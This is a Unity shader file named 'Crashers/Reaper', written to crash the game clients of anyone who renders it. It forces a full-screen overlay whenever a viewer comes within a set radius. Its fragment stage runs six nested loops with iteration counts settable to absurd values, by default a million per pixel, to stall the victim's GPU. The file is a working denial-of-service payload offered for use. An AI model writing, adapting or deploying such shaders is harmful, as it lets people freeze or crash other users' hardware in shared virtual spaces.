Shader "RAMPAG3/Crashers/Reaper"
{
    Properties
    {
        _Iterations1 ("Iterations 1", Range (1.0, 300000000000000000000000000000000000.0)) = 1000000
        _Iterations2 ("Iterations 2", Range (1.0, 300000000000000000000000000000000000.0)) = 1
        _Iterations3 ("Iterations 3", Range (1.0, 300000000000000000000000000000000000.0)) = 1
        _Iterations4 ("Iterations 4", Range (1.0, 300000000000000000000000000000000000.0)) = 1
        _Iterations5 ("Iterations 5", Range (1.0, 300000000000000000000000000000000000.0)) = 1
        _MainTex ("Texture", 2D) = "white" {}
		_Alpha ("Transparency", Range (0.0, 1.0)) = 1
		_Range ("Radius from center", Int) = 0.5
    }

    SubShader
    {
        Tags { "Queue"="Transparent" "IgnoreProjector"="True" "RenderType"="Transparent" "PreviewType"="Plane" }

		LOD 100
		ZWrite Off
		Cull Off
        ZTest Always
        Blend SrcAlpha OneMinusSrcAlpha

        Stencil
        {
           Ref 753
           Comp NotEqual
        }

        Pass
        {
            CGPROGRAM
            #pragma vertex vert
            #pragma fragment frag
            #include "UnityCG.cginc"

            sampler2D _MainTex;
			fixed4 _MainTex_ST;
			float _Alpha, _Range, _Iterations1, _Iterations2, _Iterations3, _Iterations4, _Iterations5;

			 struct v2f
            {
                float2 uv : TEXCOORD0;
                float4 pos : SV_POSITION;
            };

            v2f vert(float4 pos : POSITION, float2 uv : TEXCOORD0)
            {
				v2f o;
				o.uv = TRANSFORM_TEX(uv, _MainTex);
				float4 dist = distance(_WorldSpaceCameraPos, mul(unity_ObjectToWorld, float4(0,0,0,1)));

				#if UNITY_SINGLE_PASS_STEREO
				float offset = length(abs(unity_StereoWorldSpaceCameraPos[0] - unity_StereoWorldSpaceCameraPos[1]));
				float4 abspos = pos + half4((0.5-1*unity_StereoEyeIndex)*offset, 0, 0, 0);
				#else
				float4 abspos = pos;
				#endif
				abspos.z = -abspos.z;
				o.pos = mul(UNITY_MATRIX_P, abspos);
				o.pos = o.pos - o.pos*step(_Range, dist);

				return o;
            }


            float4 frag(v2f i) : SV_Target
            {
                float power;
                float power1;
                fixed4 uvnew;
				uvnew = tex2D(_MainTex, i.uv);

                for (int i = 0; i <= _Iterations1; i++) {
                    for (int i = 0; i <= _Iterations2; i++) {
                        for (int i = 0; i <= _Iterations2; i++) {
                            for (int i = 0; i <= _Iterations3; i++) {
                                for (int i = 0; i <= _Iterations4; i++) {
                                    for (int i = 0; i <= _Iterations5; i++) {
                                        power = pow(0, 0);
                                        power1 = pow(0, 0);
                                    }
                                }
                            }
                        }
                    }
                }

				return uvnew*float4(pow(power,power1), pow(power,power1), pow(power,power1), _Alpha);
            }
            ENDCG
        }
    }
}
